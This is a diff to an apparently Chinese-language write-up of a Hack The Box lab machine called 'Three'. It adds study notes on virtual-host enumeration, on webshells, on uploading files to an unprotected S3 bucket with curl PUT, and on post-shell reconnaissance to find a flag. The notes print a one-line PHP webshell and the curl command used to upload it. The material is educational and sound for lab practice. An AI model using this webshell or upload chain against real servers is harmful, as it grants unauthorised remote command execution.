@@ -146,9 +146,121 @@ ls /var/www/ → cat flag.txt
 
 ---
 
-### 四、Windows 环境工具
+### 四、学习笔记
 
-#### 4.1 vhost-enum.py — 虚拟主机枚举
+本节记录了本次实战中遇到的概念问题和解答，方便日后回顾。
+
+#### 4.1 虚拟主机（vhost）枚举原理
+
+**问题："同一个 IP 为什么能绑定多个网站？"**
+
+这是 HTTP/1.1 的 `Host` 请求头机制。用户浏览器访问 `s3.thetoppers.htb` 时，DNS 先解析到 IP `10.129.227.248`，然后浏览器发送：
+
+```
+GET / HTTP/1.1
+Host: s3.thetoppers.htb
+```
+
+Web 服务器（Apache/Nginx）收到请求后读取 `Host` 头，根据配置把请求路由到不同的网站目录，这就是虚拟主机（Virtual Host）。
+
+**枚举原理：** 用字典中的子域名前缀（`s3`、`www`、`admin`...）拼接主域名，逐个作为 `Host` 头发送请求。如果某个子域名返回的内容长度/状态码与基准不同，说明该虚拟主机存在且配置了不同的服务。
+
+**Windows 替代工具：** 自编写的 `vhost-enum.py`，替代 Linux 下的 `gobuster vhost` / `ffuf`。
+
+#### 4.2 Webshell 是什么
+
+**问题："Shell 是什么？Webshell 又是什么？"**
+
+| 概念 | 解释 | 类比 |
+|------|------|------|
+| Shell | 能接受命令并执行的程序 | Windows 的 CMD 黑窗口，Linux 的终端 |
+| Webshell | 通过 Web（HTTP）操控的 Shell | 在浏览器/curl 里敲服务器命令 |
+
+在这台机器上我们上传了 webshell：
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+这段代码只有一行，但作用非常强大：
+
+- `$_GET['cmd']`：从 URL 中取 `cmd=` 后面的值
+- `system(...)`：把取到的值当作系统命令执行
+
+所以访问 `shell.php?cmd=whoami` 就等于在服务器上敲了 `whoami`。
+
+**有了 webshell 就相当于有了远程命令执行（RCE）能力。**
+
+#### 4.3 为什么能用 curl 上传文件（S3 PUT）
+
+**问题："curl 不是下载工具吗？为什么能上传文件？"**
+
+curl 支持多种 HTTP 方法，不只是 GET（下载）：
+
+| HTTP 方法 | curl 参数 | 用途 |
+|-----------|-----------|------|
+| GET | 默认 | 获取资源 |
+| PUT | `-X PUT` | 上传/替换文件 |
+| DELETE | `-X DELETE` | 删除文件 |
+
+这次上传 webshell 的本质：
+
+```
+curl -X PUT -d "文件内容" http://IP/桶名/shell.php
+│         │       │              │
+│         │       │              └── 目标路径：存到桶里，命名为 shell.php
+│         │       └── 要写入的内容：PHP 代码
+│         └── 使用 PUT 方法（保存文件）
+└── 传话筒：把请求送到服务器
+```
+
+为什么能成功？因为这个 **S3 桶没有开启写保护**，任何人均可 PUT 文件。正规 S3 需要签名认证。
+
+#### 4.4 AWS CLI 与 curl 的对照
+
+**问题："Academy 用的 awscli，你怎么用 curl？"**
+
+Windows 上不方便安装 `awscli`，所以用 curl 直接操作 S3 REST API，效果完全等价：
+
+| 操作 | awscli | curl |
+|------|--------|------|
+| 列出桶中文件 | `aws s3 ls s3://桶名 --endpoint-url=...` | `curl -H "Host: s3.xx" http://IP/桶名` |
+| 下载文件 | `aws s3 cp s3://桶名/文件 .` | `curl -H "Host: s3.xx" http://IP/桶名/文件` |
+| 上传文件 | `aws s3 cp shell.php s3://桶名/` | `curl -X PUT -H "Host: s3.xx" -d "代码" http://IP/桶名/shell.php` |
+
+两者都是向相同的 S3 REST API 发送 HTTP 请求，只是命令格式不同。curl 方式是底层本质，awscli 在此基础上加了封装。
+
+#### 4.5 拿到 Shell 后如何找 Flag（内网侦查） 
+
+**问题："怎么知道 flag 在 `/var/www/` 下？"**
+
+实战中不应该靠猜，而是按步骤侦查：
+
+```bash
+# 1. 先看自己在哪
+cmd=pwd
+→ /var/www/html
+
+# 2. 看当前目录有什么
+cmd=ls
+→ images  index.php  shell.php
+
+# 3. 往上一级看
+cmd=ls ../
+→ flag.txt  html
+
+# 4. 找到 flag
+cmd=cat ../flag.txt
+→ a980d99281a28d638ac68b9bf9453c2b
+```
+
+核心思路：拿到 shell 后先摸底（pwd → ls → cd），逐层探索，而不是直接猜路径。
+
+---
+
+### 五、Windows 环境工具
+
+#### 5.1 vhost-enum.py — 虚拟主机枚举
 
 ```bash
 vhost-enum <IP> <主域名>
@@ -161,7 +273,7 @@ vhost-enum <IP> <主域名>
 
 **核心逻辑：** 遍历子域名列表，每个子域名构造 `Host: sub.domain` 头，对比各响应长度差异。
 
-#### 4.2 S3 操作对照
+#### 5.2 S3 操作对照
 
 | 操作 | 命令 |
 |------|------|
@@ -174,7 +286,7 @@ vhost-enum <IP> <主域名>
 
 ---
 
-### 五、九台机器总览
+### 六、九台机器总览
 
 | # | 机器 | 服务 | 攻击方式 | 类型 |
 |---|------|------|----------|------|
@@ -192,7 +304,7 @@ Three 的突破点：S3 存储桶**可写入** + Web 源码托管在 S3 → 上�
 
 ---
 
-### 六、修复建议
+### 七、修复建议
 
 | 问题 | 建议 |
 |------|------|
